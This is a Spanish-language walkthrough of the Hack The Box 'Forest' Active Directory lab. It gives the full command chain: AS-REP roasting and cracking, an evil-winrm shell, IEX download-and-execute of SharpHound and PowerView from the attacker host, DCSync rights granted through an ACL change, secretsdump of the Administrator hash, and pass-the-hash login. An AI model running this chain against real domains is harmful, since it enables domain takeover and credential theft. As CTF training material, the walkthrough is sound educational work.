# Forest

## Información General

<h3> Dificultad: <img src="https://img.shields.io/badge/Facil-green"> </h3>

<h3> Sistema operativo: Windows</h3>

<h3> Vulnerabilidad explotada: DCSync Exploitation - Secretsdump.py </h3>

<h3> Fecha de resolución: 19/11/2025 </h3>

<h3>Enlace de la mv: <a href="https://app.hackthebox.com/machines/212/information" target="_blank">Forest</a></h3>

### *Leer el documentro en Ingles* <a href="forest_ingles.md">Forest</a>

## Reconocimiento

**HTB** nos proporciona la ip de la máquina objetivo **10.129.219.42**

Voy a establecer en el fichero **/etc/hosts** la **ip de la mv objetivo**, la voy a llamar **htb.local**
### Ping

Dependiendo del resultado podemos deducir si es una máquina linux o window, por ejemplo:

```
ping -c 1 10.129.219.42
```

Su ttl es 128. Por tanto, es una maquina Windows

### Escaneo de puertos abiertos

#### Escaneo de puerto TCP

El comando que uso con nmap es:

```
sudo nmap -p- --open -sS -sC -sV --min-rate 2000 -n -vvv -Pn 10.129.219.42
```

<p align="center"> 
<img src="images/Pasted image 20251114115615.png" width="600" alt="Resultado de Nmap">
</p>

<div align="center">

| Open port | Service      | Version                                                                                    |
| --------- | ------------ | ------------------------------------------------------------------------------------------ |
| 53        | domain       | Simple DNS Plus                                                                            |
| 88        | kerberos-sec | Microsoft Windows Kerberos (server time: 2025-11-14 10:56:20Z)                             |
| 135       | msrpc        | Microsoft Windows RPC                                                                      |
| 139       | netbios-ssn  | Microsoft Windows netbios-ssn                                                              |
| 389       | ldap         | Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) |
| 445       | microsoft-ds | Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: HTB)                      |
| 464       | kpasswd5?    | -                                                                                          |
| 593       | ncacn_http   | Microsoft Windows RPC over HTTP 1.0                                                        |
| 636       | tcpwrapped   | -                                                                                          |
| 3269      | tcpwrapped   | -                                                                                          |
| 5985      | http         | Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                    |
| 9389      | mc-nmf       | .NET Message Framing                                                                       |
| 47001     | http         | Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                    |
| 49664     | unknown      | -                                                                                          |
| 49666     | unknown      | -                                                                                          |
| 49668     | unknown      | -                                                                                          |
| 49671     | unknown      | -                                                                                          |
| 49676     | ncacn_http   | Microsoft Windows RPC over HTTP 1.0                                                        |
| 49677     | unknown      | -                                                                                          |
| 49681     | unknown      | -                                                                                          |
| 49698     | unknown      | -                                                                                          |
| 49905     | unknown      | -                                                                                          |
</div>

## Exploración

### 1. Usamos la herramienta crackmapexec para saber a que nos estamos enfrentando

El puerto 53 es el protocolo DNS. Eso significa que en esta maquina hay un AD

Tenemos el protocolo **Samba** abierto que es el puerto **139**  y **445**.  Usaremos la herramienta crackmapexec para saber con que nos enfrentamos:

```
crackmapexec smb 10.129.219.42
```

**SMB         10.129.219.42  445    FOREST           [*] Windows 10 / Server 2016 Build 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:False)**

Cuando el AD aparece firmado el smb, hay muchos ataques del cual no puede llevar acabo como **SMB Signing** evita NTLM Relay, **ataques MITM** y **manipulación de tráfico**. 

### 2. Comprobamos si tiene recursos compartidos

```
crackmapexec smb 10.129.219.42 --shares
```

Normalmente este comando suele fallar, a mi personalmente me ha fallado. Otra alternativa, sería usar este comando:

```
smbclient -L 10.129.219.42 -N
```

Listas directorios con una sesión null sesion

<p align="center"> 
<img src="images/Pasted image 20251117105541.png" width="600" alt="Resultado de Nmap">
</p>

Esto me da que no hay nada compartido

### 3. Enumeración del dominio

En el fichero **/etc/hosts** establezco la ip de la maquina victima junto el nombre del dominio

Empezamos enviando solicitud DNS a nuestro Domain Controller

```
dig @10.129.219.42 htb.local
```

<p align="center"> 
<img src="images/Pasted image 20251117110307.png" width="600" alt="Resultado de Nmap">
</p>

Parece que va bien, lo siguiente sería **enumerar los servidores de correo**

```
dig @10.129.219.42 htb.local mx
```

<p align="center"> 
<img src="images/Pasted image 20251117110530.png" width="600" alt="Resultado de Nmap">
</p>

Se podria esos dominio en el **etc/hosts** pero no conseguiríamos gran cosa. 

Lo siguiente, sería enumerar los **new servers**

```
dig @10.129.219.42 htb.local ns
```

Pero no me funciona

Tambien podriamos probar **enumerar sudminios**

```
dig @10.129.219.42 htb.local axfr
```

pero tampoco funciona

### 4. Enumeración de usuarios, grupos, descripciones de usuarios (LDAP)

#### Enumerar usuarios 

Con la herramienta **rpcclient** podemos llevar acabo esto:

```
rpcclient -U "" 10.129.219.42 -N enumdomusers
```

<p align="center"> 
<img src="images/Pasted image 20251117112944.png" width="600" alt="Resultado de Nmap">
</p>

#### Enumerar grupos

```
rpcclient -U "" 10.129.219.42 -N enumdomgroups
```

<p align="center"> 
<img src="images/Pasted image 20251117113018.png" width="600" alt="Resultado de Nmap">
</p>

Luego la idea siguiente seria saber que usuarios compone el grupo admin

```
querygroupmem 0x200
```

<p align="center"> 
<img src="images/Pasted image 20251117113221.png" width="600" alt="Resultado de Nmap">
</p>

Luego, sería averiguar que usuarios se refiere

```
queryuser 0x1f4
```

<p align="center"> 
<img src="images/Pasted image 20251117113351.png" width="600" alt="Resultado de Nmap">
</p>

#### Enumerar descripciones de los usuarios

```
querydispinfo
```

<p align="center"> 
<img src="images/Pasted image 20251117113613.png" width="600" alt="Resultado de Nmap">
</p>

A veces en las descripciones de los usuarios podemos encontrar la contraseña del usuario pero en este caso no se contempla.

## Explotación

### 5. Obtener TGT del usuario

```
rpcclient -U "" 10.129.219.42 -N -c "enumdomusers" | grep -oP '\[.*?\]' | grep -v 0x | tr -d '[]'
```

<p align="center"> 
<img src="images/Pasted image 20251117114651.png" width="600" alt="Resultado de Nmap">
</p>

Uso esta expresión regular para conseguir los usuarios para un .txt para llevar acabo un ataque

```
impacket-GetNPUsers htb.local/ -no-pas -usersfile user.txt
```

<p align="center"> 
<img src="images/Pasted image 20251117114942.png" width="600" alt="Resultado de Nmap">
</p>

**svc-alfresco** me dan un hash, usaremos **john the ripper** para crackear la contraseña

```
john -w:$(locate rockyou.txt) hash.txt
```

<p align="center"> 
<img src="images/Pasted image 20251117115250.png" width="600" alt="Resultado de Nmap">
</p>

Validamos el usuario con crackmapexec

user: svc-alfresco <br>
pass: s3rvice

```
crackmapexec smb 10.129.219.42 -u 'svc-alfresco' -p 's3rvice'
```

<p align="center"> 
<img src="images/Pasted image 20251117115552.png" width="600" alt="Resultado de Nmap">
</p>

Es válido

```
crackmapexec smb 10.129.219.42 -u 'svc-alfresco' -p 's3rvice' --shares
```

<p align="center"> 
<img src="images/Pasted image 20251117115956.png" width="600" alt="Resultado de Nmap">
</p>

Podríamos probar enumerar directorios y conseguir el fichero group.xml pero por ahi no van los tiros.

### 6. winrm y evil-winrm

Usamos esta herramienta si el **puerto 5985 está abierto** y si hay un **pwn3d!** en el siguiente comando:

```
crackmapexec winrm 10.129.219.42 -u 'user' -p 'pass' 
```

<p align="center"> 
<img src="images/Pasted image 20251117120354.png" width="600" alt="Resultado de Nmap">
</p>

Luego, con la herramienta **evil-winrm** conseguimos una shell interactiva

```
evil-winrm -i 10.129.219.42 -u 'svc-alfresco' -p 's3rvice'
```

<p align="center"> 
<img src="images/Pasted image 20251117121337.png" width="600" alt="Resultado de Nmap">
</p>

Flag del usuario

<p align="center"> 
<img src="images/Pasted image 20251117122123.png" width="600" alt="Resultado de Nmap">
</p>

## Explotación Posterior

```
net user svc-alfresco
```

<p align="center"> 
<img src="images/Pasted image 20251117174241.png" width="600" alt="Resultado de Nmap">
</p>

Empiezo primero investigando a que grupo pertenece el usuario **svc-alfresco**

```
net groups
```

<p align="center"> 
<img src="images/Pasted image 20251117174647.png" width="600" alt="Resultado de Nmap">
</p>

pero no aparece el grupo **service accounts** . Por tanto, usaré la herramienta **ldapdomaindump**.

```
ldapdomaindump -u 'htb.local\svc-alfresco' -p 's3rvice' 10.129.219.42
```

<p align="center"> 
<img src="images/Pasted image 20251117172402.png" width="600" alt="Resultado de Nmap">
</p>

```
python3 -m http.server 80
```

Esto te levanta un servidor te permite visualizar en este caso el archivo **domain_groups.html**
En este caso te ayuda a comprender a que grupo esta vinculado **service-account**

<p align="center"> 
<img src="images/Pasted image 20251117172919.png" width="600" alt="Resultado de Nmap">
</p>

En conclusión, **service-account** esta dentro del grupo **Domain Users**

### Instalación BloodHound y neo4j

```
sudo apt install docker.io
docker-compose
curl -L https://ghst.ly/getbhce | sudo docker-compose -f - up
```

<p align="center"> 
<img src="images/Pasted image 20251118002607.png" width="600" alt="Resultado de Nmap">
</p>

Introduzco por primera vez:

user: admin <br>
contraseña: 4OuPGC6o0pdAolzVY0dQSKiAYIOkUdoU

<p align="center"> 
<img src="images/Pasted image 20251118002728.png" width="600" alt="Resultado de Nmap">
</p>

### zip del active directory

#### En mi maquina kali

```
wget https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1
```

Luego preparo el servidor para compartir el archivo **SharpHound.ps1**:

```
python3 -m http.server 80
```

#### En mi maquina Windows victima

```
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.55/SharpHound.ps1')
Invoke-BloodHound -CollectionMethod All
```

El primer comando lo que hace es descargar SharpHound.ps1 y lo ejecuta directamente en memoria

El segundo comando Recolecta TODA la información del dominio y genera el ZIP para analizar con BloodHound

```
download C:\\Users\\svc-alfresco\\Documents\\bh\\20251117142343_BloodHound.zip data.zip
```

Me descargo el zip hacia mi maquina atacante kali linux

<p align="center"> 
<img src="images/Pasted image 20251117232814.png" width="600" alt="Resultado de Nmap">
</p>

#### ALTERNATIVA

Hay un script que nos ayuda a conseguir los datos del AD que sería el siguiente

```
#!/bin/bash 

# I always messed up the bloodhound-python syntax. This simplifies the process and asks the users for each parameter and fires off the bloodhound-python
# bloodhound-python -d <domain> -u <username> -p <password> -gc <domain> -c all -ns <ip of domain> 

echo "Domain: "
read domain 

echo "Username: "
read username

echo "Password: "
read password

echo "IP of Domain: " 
read ip_address

bloodhound-python -d $domain -u $username -p $password -gc $domain -c all -ns $ip_address
```

Que no se olvide darle permiso de ejecución. Luego introducir los datos:

<p align="center"> 
<img src="images/Pasted image 20251118023011.png" width="600" alt="Resultado de Nmap">
</p>

como resultado dara los json para luego introducirlo a bloodhound

*20251118013951_computers.json  20251118013951_containers.json  20251118013951_domains.json  20251118013951_gpos.json  20251118013951_groups.json  20251118013951_ous.json  20251118013951_users.json*

### BloodHound run

Subimos los zip al bloodhound **Dato importante, el método que me funciono fue donde pone alternativa, nose el motivo. Investigando BH es muy tiquimisquis a la hora de aceptar .zip o json que priviene del AD**

<p align="center"> 
<img src="images/Pasted image 20251118023826.png" width="600" alt="Resultado de Nmap">
</p>

Luego, me coloco en **pathfinding** y configuro lo siguiente:

<p align="center"> 
<img src="images/Pasted image 20251118024005.png" width="600" alt="Resultado de Nmap">
</p>

La idea de esto ver el recorrido que tiene el usuario **svc-alfresco** hacia a **HTB.LOCAL** para descubrir alguna vulnerabilidad

<p align="center"> 
<img src="images/Pasted image 20251118024153.png" width="600" alt="Resultado de Nmap">
</p>

Observando la gráfica e investigando lo que significa de pertenecer en el grupo **exchange windows permissions** que básicamente es crear, eliminar o modificar usuarios y grupos.

<p align="center"> 
<img src="images/Pasted image 20251118163326.png" width="600" alt="Resultado de Nmap">
</p>

Por tanto, a continuación voy a llevar a cabo, intentar crear un usuario en la mv de windows

```
net user emperador emperador123 /add /domain
net user emperador
```

<p align="center"> 
<img src="images/Pasted image 20251118165105.png" width="600" alt="Resultado de Nmap">
</p>

La idea es que este nuevo usuario, este en el grupo **Exchange Window Permissions** que es donde yo puedo realizar el ataque **DCSync**

```
net group "Exchange Windows Permissions" emperador /add
```

Preparo los siguientes comandos que he conseguido aqui. (En esta foto podemos ver una explotación que puedo llevar acabo el **nuevo usuario** creado por **svc-alfreedo** en el que consiste darle el máximo privilegio)

<p align="center"> 
<img src="images/Pasted image 20251118024453.png" width="600" alt="Resultado de Nmap">
</p>

```
$SecPassword = ConvertTo-SecureString 'emperador123' -AsPlainText -Force
```

*Convierte la contraseña en texto plano (`'emperador123'`) en un **SecureString**, el formato que usa PowerShell para almacenar contraseñas de forma segura.*

```
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\emperador', $SecPassword)
```

Crea un objeto de tipo **PSCredential**, que contiene:

- El usuario `htb.local\emperador`
- La contraseña segura creada antes

**Este objeto lo usarás después para ejecutar comandos con esas credenciales.*

Descargo la herramienta **PowerView.ps1** en mi kali para conseguir que el nuevo usuario pueda llevar acabo el ataque DCSync

```
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Recon/PowerView.ps1
```

Debo de compartir este archivo a mi maquina de windows

```
python3 -m http.server 8000
```

 Luego para ejecutar los siguientes comandos:

```
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.55:8000/PowerView.ps1')
```

**¿Qué hace?**

1. `New-Object Net.WebClient` → crea un cliente web.

2. `.downloadString('URL')` → descarga el contenido del script PowerView.

3. `IEX(...)` → **ejecuta** el contenido descargado.

**IEX = Invoke-Expression**, ejecuta código en memoria.  
Esto carga PowerView en la sesión actual sin necesidad de guardarlo en disco.

Después

```
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity emperador -Rights DCSync
```

¿Qué hace?

Este comando usa PowerView para modificar los **Access Control Lists (ACLs)** en el dominio.

- `-Credential $Cred` → el comando se ejecuta usando las credenciales creadas.

- `-TargetIdentity "DC=htb,DC=local"` → indica que quieres modificar los permisos **del objeto del dominio**.

- `-PrincipalIdentity emperador → este es el usuario al que le darás permisos.

- `-Rights DCSync` → añade derechos **DCSync** al usuario.

Luego en mi maquina atacante debería de ejecutar este comando:

```
impacket-secretsdump htb.local/emperador@10.129.219.42
```

<p align="center"> 
<img src="images/Pasted image 20251119004423.png" width="600" alt="Resultado de Nmap">
</p>

Obtengo:

User: **Administrator** <br>
Hash:  **32693b11e6aa90eb43d32c72a07ceea6** 

### Dato importante

Tengo que realizar estos comandos en la misma sesión porque sino la herramienta **impacket-secretsdump** no funcionará. Aviso la sesión del usuario **svc-alfresco** es bastante inestable.

```
$SecPassword = ConvertTo-SecureString 'emperador123' -AsPlainText -Force

$Cred = New-Object 
System.Management.Automation.PSCredential('htb.local\emperador', $SecPassword)

IEX(New-Object Net.WebClient).downloadString('http://10.10.14.55:8000/PowerView.ps1')

Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity emperador -Rights DCSync
```

Uso ahora la herramienta **crackmapexec** para verificar si el usuario tiene lo máximo privilegio, si tiene **Pw3d!** 

<p align="center"> 
<img src="images/Pasted image 20251119005015.png" width="600" alt="Resultado de Nmap">
</p>

**Lo tiene**

Obtengo la shell del usuario **Administrator**

```
evil-winrm -i 10.129.219.42 -u 'Administrator' -H '32693b11e6aa90eb43d32c72a07ceea6'
```

<p align="center"> 
<img src="images/Pasted image 20251119005550.png" width="600" alt="Resultado de Nmap">
</p>

Obtengo la flash de root

<p align="center"> 
<img src="images/Pasted image 20251119005439.png" width="600" alt="Resultado de Nmap">
</p>

## Conclusión

La máquina **Forest** de **Hack The Box** me resultó bastante compleja, ya que es apenas mi segunda vez trabajando con un entorno de Active Directory. Cabe destacar que la máquina Windows a la que se accede durante el proceso es bastante inestable, lo que añade dificultad adicional durante la explotación.

En la fase de enumeración, obtuve los primeros usuarios utilizando **rpcclient**, enumerando tanto cuentas como grupos del dominio. Posteriormente empleé la herramienta **impacket-GetNPUsers** para identificar un usuario vulnerable a AS-REP Roasting y, tras ello, utilicé **John the Ripper** para recuperar su contraseña.

Para el análisis del dominio, desplegué **BloodHound** mediante _docker-compose_ y recopilé la información del Active Directory usando el recolector **SharpHound**, obteniendo los archivos .json necesarios. Gracias al grafo generado en BloodHound, pude identificar la vulnerabilidad asociada al grupo **Exchange Windows Permissions**, específicamente el abuso de permisos **DCSync**.

Finalmente, tras aplicar la explotación indicada en BloodHound (con algunos ajustes en los comandos), utilicé **impacket-secretsdump** para extraer el hash del usuario **Administrator** y obtener la ultima flag de root.